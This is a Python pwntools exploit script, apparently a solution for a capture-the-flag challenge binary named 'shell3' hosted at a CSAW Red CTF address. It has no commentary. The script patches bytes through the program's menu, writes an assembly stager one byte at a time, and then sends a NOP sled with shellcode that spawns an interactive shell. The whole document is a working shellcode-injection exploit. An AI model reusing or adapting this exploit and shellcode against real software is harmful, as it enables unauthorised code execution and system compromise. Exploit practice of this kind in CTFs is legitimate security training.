from pwn import *

e = ELF("./shell3")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p, "b *0x400ab8")

if is_remote:
  p = remote("pwn.red.csaw.io", 5011)
else:
  p = process(e.path)

p.sendlineafter(">", "3")

p.sendlineafter(":", "36")
p.sendafter(":", chr(0xe + 0x147 - 0xf6))

p.sendlineafter(":", "1")
p.sendafter(":", "\x1d")

p.sendlineafter(":", "0")
p.sendafter(":", "\xeb")

pay = asm("""
  xor rdi, rdi
  mov eax, 0x014117d1
  xor eax, 0x01011001
  call rax
""")


print(len(pay))

for i in range(len(pay)):
  p.sendlineafter(":", str(6 + i))
  p.sendafter(":", pay[i])

debug()

p.sendlineafter(":", "0")
p.sendafter(":", "\x90")

ui.pause()

p.send("\x90" * 0x15 + asm(shellcraft.sh()))


p.interactive()
